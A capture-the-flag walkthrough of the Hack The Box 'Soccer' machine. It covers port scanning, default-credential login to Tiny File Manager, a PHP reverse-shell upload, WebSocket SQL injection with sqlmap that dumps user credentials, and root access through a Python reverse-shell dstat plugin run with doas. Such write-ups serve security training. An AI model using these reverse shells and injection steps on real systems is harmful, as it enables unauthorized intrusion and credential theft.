# Hack The Box - Soccer Walkthrough 

## Reconnaissance
Retrieving the IP address of the machine, I started a quick inital Nmap scan to see which ports are open and which services are running on those ports.
```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Soccer]
└─$ sudo nmap -sC -sV -O -oA nmap/initial 10.10.11.194
[sudo] password for darshan: 
Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-07 02:50 EST
Nmap scan report for 10.10.11.194
Host is up (0.46s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ad:0d:84:a3:fd:cc:98:a4:78:fe:f9:49:15:da:e1:6d (RSA)
|   256 df:d6:a3:9f:68:26:9d:fc:7c:6a:0c:29:e9:61:f0:0c (ECDSA)
|_  256 57:97:56:5d:ef:79:3c:2f:cb:db:35:ff:f1:7c:61:5c (ED25519)
80/tcp   open  http            nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://soccer.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
9091/tcp open  xmltec-xmlmail?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq, drda, informix: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   GetRequest: 
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 139
|     Date: Tue, 07 Feb 2023 07:50:52 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error</title>
|     </head>
|     <body>
|     <pre>Cannot GET /</pre>
|     </body>
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 143
|     Date: Tue, 07 Feb 2023 07:50:53 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error</title>
|     </head>
|     <body>
|     <pre>Cannot OPTIONS /</pre>
|     </body>
|     </html>
|   RTSPRequest: 
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 143
|     Date: Tue, 07 Feb 2023 07:50:54 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error</title>
|     </head>
|     <body>
|     <pre>Cannot OPTIONS /</pre>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9091-TCP:V=7.92%I=7%D=2/7%Time=63E202D2%P=x86_64-pc-linux-gnu%r(inf
SF:ormix,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\
SF:n\r\n")%r(drda,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x2
SF:0close\r\n\r\n")%r(GetRequest,168,"HTTP/1\.1\x20404\x20Not\x20Found\r\n
SF:Content-Security-Policy:\x20default-src\x20'none'\r\nX-Content-Type-Opt
SF:ions:\x20nosniff\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nCon
SF:tent-Length:\x20139\r\nDate:\x20Tue,\x2007\x20Feb\x202023\x2007:50:52\x
SF:20GMT\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=
SF:\"en\">\n<head>\n<meta\x20charset=\"utf-8\">\n<title>Error</title>\n</h
SF:ead>\n<body>\n<pre>Cannot\x20GET\x20/</pre>\n</body>\n</html>\n")%r(HTT
SF:POptions,16C,"HTTP/1\.1\x20404\x20Not\x20Found\r\nContent-Security-Poli
SF:cy:\x20default-src\x20'none'\r\nX-Content-Type-Options:\x20nosniff\r\nC
SF:ontent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20143\r
SF:\nDate:\x20Tue,\x2007\x20Feb\x202023\x2007:50:53\x20GMT\r\nConnection:\
SF:x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en\">\n<head>\n<met
SF:a\x20charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Ca
SF:nnot\x20OPTIONS\x20/</pre>\n</body>\n</html>\n")%r(RTSPRequest,16C,"HTT
SF:P/1\.1\x20404\x20Not\x20Found\r\nContent-Security-Policy:\x20default-sr
SF:c\x20'none'\r\nX-Content-Type-Options:\x20nosniff\r\nContent-Type:\x20t
SF:ext/html;\x20charset=utf-8\r\nContent-Length:\x20143\r\nDate:\x20Tue,\x
SF:2007\x20Feb\x202023\x2007:50:54\x20GMT\r\nConnection:\x20close\r\n\r\n<
SF:!DOCTYPE\x20html>\n<html\x20lang=\"en\">\n<head>\n<meta\x20charset=\"ut
SF:f-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Cannot\x20OPTIONS\x
SF:20/</pre>\n</body>\n</html>\n")%r(RPCCheck,2F,"HTTP/1\.1\x20400\x20Bad\
SF:x20Request\r\nConnection:\x20close\r\n\r\n")%r(DNSVersionBindReqTCP,2F,
SF:"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r
SF:(DNSStatusRequestTCP,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnecti
SF:on:\x20close\r\n\r\n")%r(Help,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\
SF:nConnection:\x20close\r\n\r\n")%r(SSLSessionReq,2F,"HTTP/1\.1\x20400\x2
SF:0Bad\x20Request\r\nConnection:\x20close\r\n\r\n");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=2/7%OT=22%CT=1%CU=37887%PV=Y%DS=2%DC=I%G=Y%TM=63E20328
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)OPS(
OS:O1=M537ST11NW7%O2=M537ST11NW7%O3=M537NNT11NW7%O4=M537ST11NW7%O5=M537ST11
OS:NW7%O6=M537ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(
OS:R=Y%DF=Y%T=40%W=FAF0%O=M537NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=Y%DF=Y%T=40%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T2(R=N)T3(R=N)T4(R
OS:=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=
OS:AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=
OS:40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID
OS:=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 100.79 seconds
```

So, we got back the results and `3` ports open
- Port `22`: running `OpenSSH 8.2p`.
- Port `80`: runninng `nginx 1.18.0`.
- Ports `9091`: running `xmlmail`.


Before starting enumeration, I ran a more comprehensive scan in the background to make sure that I did not miss anything.

So I ran `Rustscan` that covers all ports.
```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Soccer]
└─$ rustscan -a 10.10.11.194 --range 1-65535
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.11.194:22
Open 10.10.11.194:80
Open 10.10.11.194:9091
[~] Starting Nmap
[>] The Nmap command to be run is nmap -vvv -p 22,80,9091 10.10.11.194

Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-07 02:52 EST
Initiating Ping Scan at 02:52
Scanning 10.10.11.194 [2 ports]
Completed Ping Scan at 02:52, 0.18s elapsed (1 total hosts)
Initiating Connect Scan at 02:52
Scanning soccer.htb (10.10.11.194) [3 ports]
Discovered open port 22/tcp on 10.10.11.194
Discovered open port 80/tcp on 10.10.11.194
Discovered open port 9091/tcp on 10.10.11.194
Completed Connect Scan at 02:52, 0.79s elapsed (3 total ports)
Nmap scan report for soccer.htb (10.10.11.194)
Host is up, received syn-ack (0.36s latency).
Scanned at 2023-02-07 02:52:24 EST for 1s

PORT     STATE SERVICE        REASON
22/tcp   open  ssh            syn-ack
80/tcp   open  http           syn-ack
9091/tcp open  xmltec-xmlmail syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 1.02 seconds
```

So, now that it was confirmed that 3 ports were open, I could move on with the enumeration.

## Enumeration
I decided to start with enumerating port `80` first, as usual, and as soon as I entered the IP address, I got an error, but looking at the URL, it was changed to `soccer.htb`

![soc-1](https://user-images.githubusercontent.com/87711310/217189341-5a90d26c-116c-4cfd-8673-d9ad6df5fe29.png)

So I added the the host to the `/etc/hosts` file.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Soccer]
└─$ sudo echo 10.10.11.194 soccer.htb >> /etc/hosts
```

Now, On visiting the web-site I was presented a a blog related to `2022 Fifa World Cup` which was pretty basic blog.

![soc-2](https://user-images.githubusercontent.com/87711310/217189571-4471656f-be93-42f3-ac7a-8f360523fba3.png)

So I decided to run `gobuster` on the website.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Soccer]
└─$ gobuster dir -w /usr/share/wordlists/SecLists-master/Discovery/Web-Content/directory-list-1.0.txt -u http://soccer.htb -t 50
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://soccer.htb
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/SecLists-master/Discovery/Web-Content/directory-list-1.0.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/02/07 02:55:26 Starting gobuster in directory enumeration mode
===============================================================
/tiny                 (Status: 301) [Size: 178] [--> http://soccer.htb/tiny/]
```

Now that I found a `/tiny` directory, I visited it and found a login page. On closely inscpecting the page, it was `Tiny file manager` application and on googling it, I found it's `documentation` on `github`: [Tiny File Manager](https://github.com/prasathmani/tinyfilemanager)

On reading the document, I found login credentials.

![soc-4](https://user-images.githubusercontent.com/87711310/217190883-522a8e99-d6e6-4ffc-80b2-3eb806eecab7.png)

Using the credentials (admin:admin@123), I was able to log in to the file manager.

![soc-5](https://user-images.githubusercontent.com/87711310/217191202-55ccfb59-afcc-4347-8732-3fbc34a28665.png)

Since it is a file manager, and it was made with `PHP`, I decided to try and upload a `php-reverse-shell` into the `tiny/upload` directory as we can only upload there.

I used [PentestMonkey's Reverse shell](https://github.com/pentestmonkey/php-reverse-shell)

![soc-6](https://user-images.githubusercontent.com/87711310/217194739-deb0ed74-7ff9-4f25-b593-a211094f38e7.png)

I uploaded the shell in the `/tiny/uploads` folder as I was not able to upload it in any other folder. Once uploaded you can see the preview of the fil you uploaded.

![soc-7](https://user-images.githubusercontent.com/87711310/217195443-36c56d0e-7551-4177-8e03-2a8485dcc5d6.png)

You can run the exploit by visiting this folder.

```
soccer.htb/tiny/uploads/rev.php
```

Now, I started a `netcat` listener on my machine with the port I provided in the reverse shell and once I clicked on the reverse shell on the webpage, I got back a shell

```                                                                                                                                                          
┌──(darshan㉿kali)-[~/Desktop/Misc]
└─$ nc -lvnp 9999               
listening on [any] 9999 ...
connect to [10.10.16.6] from (UNKNOWN) [10.10.11.194] 51382
Linux soccer 5.4.0-135-generic #152-Ubuntu SMP Wed Nov 23 20:19:22 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
 08:46:52 up 58 min,  0 users,  load average: 0.00, 0.03, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```


Now, I tried to upgrade the shell, using following python command.

```python
python -c 'import pty; pty.spawn("/bin/bash")'
```

But I got an error stating `python does not exist`. Guess I have to work with this shell only.

Now, I tried grabbing the user flag but couldn't

```
$ cat user.txt
cat: user.txt: Permission denied
```

If I look at the permissions of `user` flag, it was owned by player and root had the permissions

```
$ ls -l
total 4
-rw-r----- 1 root player 33 Feb  7 07:49 user.txt
```

After getting a hint from `HTB forum`, I found out that I had to look at the `/etc/hosts` file in the victims machine


```
$ cat /etc/hosts
127.0.0.1       localhost       soccer  soccer.htb      soc-player.soccer.htb
```

And there was a `soc-player.soccer.htb` host added to it.

So I decided to add the host to my `/etc/hosts` file.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Soccer]
└─$ sudo echo 10.10.11.194 soc-player.soccer.htb >> /etc/hosts
```

Looking at the `soc-player.soccer.htb` I got the similar page but this time there was a `login` page and a `signup` page.

![soc-8](https://user-images.githubusercontent.com/87711310/217204408-4c8a1c0f-0c8d-44b9-b5f1-db48aebbf0ed.png)

So, I signed up and logged into the web-site to see whats happening. After login, we can see that we have a ticket-checking system

![soc-9](https://user-images.githubusercontent.com/87711310/217205669-400b55a9-e6c4-42cc-bb75-71aca05ad318.png)

Using Wappalyzer, I found out that the website was developed using `Node.js`

![soc-11](https://user-images.githubusercontent.com/87711310/217208328-9392d7df-4f00-4d90-b038-d7a715dff06a.png)


I couldn't find anything, so I decided to use Burp to intercept the request and possibly figure out what's going on with the ticketing system.

Now, I found out that the website was fetching the information using websockets.

At this point, I did not know anything about WebSockets, let alone how to exploit them. So, I started googling to figure out more about it.

I found this tool that automates `blind SQL Injection over WebSocket`

![soc-12](https://user-images.githubusercontent.com/87711310/217248989-e5329c57-ff11-4d9f-8522-0e0503b10622.png)

I found the top result to be perfect fit for need, as they provide a python script to act as MITM for payloads, as like a translator; now we can use this with sqlmap.



Before running the exploit, I had to make some changes: 
- changing the `ws_server` to `ws://soc-player.soccer.htb:9091/`
- changing the `data` parameter to: `{"id":"%s"}`

And running the exploit
```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Soccer]
└─$ python3 exploit.py
[+] Starting MiddleWare Server
[+] Send payloads in http://localhost:8081/?id=*
```

And running the sqlmap 

```
sqlmap -u “http://localhost:8081/?id="
```

![soc-14](https://user-images.githubusercontent.com/87711310/217253798-4d9e4913-e140-4546-b31a-92f4c0a04733.png)

SQL map got a time base SQL injection in the WebSocket.

So, I enumerated it further.

```
sqlmap -u “http://localhost:8081/?id=" --current-db
```

![soc-15](https://user-images.githubusercontent.com/87711310/217258493-dd1402bd-c31e-457b-ac0c-9dab0f638e63.png)

I was currently in the `soccer_db` database

Further, I looked for the `tables` in the database

```
sqlmap -u “http://localhost:8081/?id=" -D soccer_db --tables
```

![soc-16](https://user-images.githubusercontent.com/87711310/217258954-677e1e69-ab1d-4356-b064-7f00401b8f08.png)

There was only table named `accounts`

So, I dumped its data

```
sqlmap -u "http://localhost:8081/?id=" -D soccer_db -T accounts --dump 
```

![soc-17](https://user-images.githubusercontent.com/87711310/217259392-6013ae0d-5ecb-47f1-afe1-bfd1f605475d.png)

Looking at the contents of the accounts table, there was username and password of a user `player`. So I decided to use these credentials to see if I could login through `ssh`

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Soccer]
└─$ ssh player@soccer.htb                                             
The authenticity of host 'soccer.htb (10.10.11.194)' can't be established.
ED25519 key fingerprint is SHA256:PxRZkGxbqpmtATcgie2b7E8Sj3pw1L5jMEqe77Ob3FE.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'soccer.htb' (ED25519) to the list of known hosts.
player@soccer.htb's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-135-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Feb  7 13:37:34 UTC 2023

  System load:           0.0
  Usage of /:            70.4% of 3.84GB
  Memory usage:          21%
  Swap usage:            0%
  Processes:             229
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.194
  IPv6 address for eth0: dead:beef::250:56ff:feb9:a39


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Tue Dec 13 07:29:10 2022 from 10.10.14.19
player@soccer:~$ ls
user.txt
player@soccer:~$ whoami
player
player@soccer:~$ cat user.txt
[REDACTED]
```

I grabbed the user flag.

## Privilege Escalation
Now, I decided to start with `sudo -l` to look at the services I could run as a `root` user.

```
player@soccer:~$ sudo -l
[sudo] password for player: 
Sorry, user player may not run sudo on localhost.
```

I was not allowed to run `sudo`, so I decided to transfer and run `linpeas` on the machine and found something that I could exploit.

```
[+] Checking doas.conf
permit nopass player as root cmd /usr/bin/dstat
```

If we see the output of the file we can see that the player can run the command as the root user

1. 
What is [Doas](https://man.openbsd.org/doas)

The doas utility executes the given command as another user. The command argument is mandatory unless `-C`, `-L`, or `-s` is specified.

The user will be required to authenticate by entering their password, unless configured otherwise.

So it's like a sudo utility and we can run dstat as the root user. Basically, it's like the Sudo -l where we find the command we can run as sudo user

2. What is [dstat](https://linux.die.net/man/1/dstat)

Dstat is a versatile replacement for vmstat, iostat and ifstat. Dstat overcomes some of the limitations and adds some extra features.

So now, I started by looking for `dstat` on the victim's machine

```
player@soccer:/$ find / -name dstat -type d 2>/dev/null
/usr/share/doc/dstat
/usr/share/dstat
/usr/local/share/dstat
```

if we see `/usr/share/dstat/`, we can see different plugins that dstat can use.

![soc-18](https://user-images.githubusercontent.com/87711310/217282101-e268c535-e29a-41fb-8b7f-bc4d2f096f8b.png)


All the plugins are written in python and with a prefix of `dstat_**`

So, then i decided to Create a python plugin called `dstat_exploit.py` in `/usr/local/share/dstat/` with below code

```python
import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect((“<your-IP>”,2929));

os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);

import pty; pty.spawn(“/bin/sh”)
```

Started a netcat listener on my machine.

Execute the following command to run the above file as root.

```
doas -u root /usr/bin/dstat --exploit
```

Once done, I went back to my netcat listener and I got back a shell.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Soccer]
└─$ nc -lvnp 9998
listening on [any] 9998 ...
connect to [10.10.16.6] from (UNKNOWN) [10.10.11.194] 54714
# whoami
whoami
root
```

Grabbing the root flag

```
# cat /root/root.txt
cat /root/root.txt
[REDACTED]
```
